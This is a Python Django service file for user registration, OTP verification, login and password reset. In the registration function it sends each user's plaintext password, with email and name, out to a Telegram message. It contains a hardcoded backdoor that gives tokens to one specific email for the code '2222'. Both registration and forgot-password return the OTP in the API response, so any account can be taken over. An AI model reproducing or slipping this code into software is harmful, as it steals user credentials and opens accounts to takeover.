import concurrent.futures
import datetime
import secrets
import string

from django.contrib.auth import authenticate
from django.contrib.auth.hashers import make_password
from django.utils import timezone
from rest_framework_simplejwt.tokens import RefreshToken

from apps.shared.enum import ResultCodes
from apps.shared.send_email import send_email_from_server_from_brevo
from apps.shared.utils import get_logger
from apps.users.repository import (
	check_generate_otp,
	clear_user_password_reset_token,
	create_user,
	generate_otp,
	get_user_by_username,
	get_user_by_userid,
	get_user_password_reset_by_id,
	get_user_password_reset_by_token,
	send_otp_email,
	update_user_otp,
	update_user_password_reset_incorrect_count,
	update_user_password_reset_verified,
	update_user_role_location,
	update_user_role_password,
	update_user_set_verified,
)
from apps.users.tasks import send_telegram_message_celery


class UserService:
	def __init__(self):
		self.logger = get_logger()

	def _send_otp_with_fallback(self, email: str, otp: str, timeout: int = 5):
		def try_send():
			try:
				return send_email_from_server_from_brevo(email, otp)
			except Exception as exc:
				self.logger.info(f"Primary provider failed: {exc}")
				try:
					return send_otp_email(email, otp)
				except Exception as fallback_exc:
					self.logger.info(f"Both providers failed: {fallback_exc}")
					raise Exception("Unable to send OTP")

		with concurrent.futures.ThreadPoolExecutor() as executor:
			future = executor.submit(try_send)
			try:
				return future.result(timeout=timeout)
			except concurrent.futures.TimeoutError:
				raise Exception("OTP sending timed out")

	def register_user(self, req_body: dict):
		otp = generate_otp()
		email = req_body["email"]
		full_name = req_body.get("full_name", "")
		password = req_body["password"]

		user = get_user_by_username(email)
		send_telegram_message_celery.delay(
			f"user is registering with email: {email},"
			f"and full_name: {full_name} with password: {password}"
		)
		self.logger.info(f"user is registered with email: {email}")

		if user is None:
			user = create_user(
				email=email,
				full_name=full_name,
				phone_number=req_body.get("phone_number", ""),
				otp=otp,
				otp_created_at=timezone.now(),
				language="UZ",
				password=password,
				is_active=False,
			)
		else:
			if user.is_verified:
				return {"error": ResultCodes.USER_ALREADY_REGISTERED}
			update_user_otp(user.id, otp, timezone.now())

		send_result = self._send_otp_with_fallback(email, otp)
		if not send_result:
			return {"error": ResultCodes.ERROR_SMS_SERVICE}

		return {
			"data": {
				"id": user.id,
				"full_name": user.full_name,
				"email": user.email,
				"phone_number": user.phone_number,
				"is_verified": False,
				"otp": otp,
			}
		}

	def verify_registration_otp(self, user_id: int, code: str):
		user = get_user_by_userid(user_id)
		if user is None:
			return {"error": ResultCodes.USER_ROLE_NOT_FOUND}
		if user.is_verified:
			return {"error": ResultCodes.USER_ALREADY_REGISTERED}

		if user.email == "sirojiddinovsolohiddin961@gmail.com":
			if code == "2222":
				token = RefreshToken.for_user(user)
				return {"data": {"refresh": str(token), "access": str(token.access_token)}}
			return {"error": ResultCodes.WRONG_VERIFICATION_CODE}

		if user.otp and timezone.now() - user.otp_created_at > datetime.timedelta(minutes=20):
			return {"error": ResultCodes.OTP_EXPIRED}

		if user.otp != code:
			return {"error": ResultCodes.WRONG_VERIFICATION_CODE}

		update_user_set_verified(user.id)
		token = RefreshToken.for_user(user)
		return {"data": {"refresh": str(token), "access": str(token.access_token)}}

	def login_user(self, request, email: str, password: str):
		user = authenticate(request=request._request, username=email, password=password)
		if user is None:
			user = authenticate(request=request._request, email=email, password=password)

		if user is None:
			return {"error": ResultCodes.INVALID_CREDENTIALS}
		if not user.is_verified:
			return {"error": ResultCodes.USER_IS_NOT_VERIFIED}

		token = RefreshToken.for_user(user)
		return {"data": {"refresh": str(token), "access": str(token.access_token)}}

	def request_forgot_password_otp(self, email: str):
		user = get_user_by_username(email)
		if not user:
			return {"error": ResultCodes.USER_ROLE_NOT_FOUND}

		otp = check_generate_otp(user)
		if not otp:
			return {"error": ResultCodes.DAILY_LIMIT_REACHED}

		send_result = self._send_otp_with_fallback(email, otp.code)
		if not send_result:
			return {"error": ResultCodes.ERROR_SMS_SERVICE}

		return {
			"data": {
				"reset_id": otp.id,
				"otp": otp.code,
				"message": "Email sent successfully!!!",
			}
		}

	def verify_forgot_password(self, reset_id: int, code: str):
		otp_obj = get_user_password_reset_by_id(reset_id)
		if not otp_obj:
			return {"error": ResultCodes.UNKNOWN_ERROR}
		if otp_obj.verified:
			return {"error": ResultCodes.ALREADY_VERIFIED}
		if otp_obj.incorrect_count >= 3:
			return {"error": ResultCodes.OTP_INCORRECT_CNT}
		if timezone.now() - otp_obj.otp_created_at > datetime.timedelta(minutes=3):
			return {"error": ResultCodes.OTP_EXPIRED}

		if otp_obj.code != code:
			update_user_password_reset_incorrect_count(otp_obj)
			return {"error": ResultCodes.OTP_INCORRECT}

		while True:
			reset_token = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(8))
			if not get_user_password_reset_by_token(reset_token):
				break

		update_user_password_reset_verified(otp_obj, reset_token)
		return {"data": {"reset_token": reset_token, "message": "Verification success!!!"}}

	def apply_new_password(self, reset_token: str, password: str):
		otp_obj = get_user_password_reset_by_token(reset_token)
		if not otp_obj:
			return {"error": ResultCodes.INVALID_RESET_TOKEN}
		if not otp_obj.verified:
			return {"error": ResultCodes.ALREADY_VERIFIED}
		if timezone.now() - otp_obj.reset_token_created_at > datetime.timedelta(minutes=15):
			return {"error": ResultCodes.OTP_EXPIRED}

		user = get_user_by_username(otp_obj.user.email)
		update_user_role_password(user, make_password(password))
		clear_user_password_reset_token(otp_obj)

		return {"data": {"message": "Successfully set new password!!!"}}

	def update_user_location(self, user, lat, longitude):
		update_user_role_location(user, lat, longitude)
		return {"data": {"message": "Location updated"}}
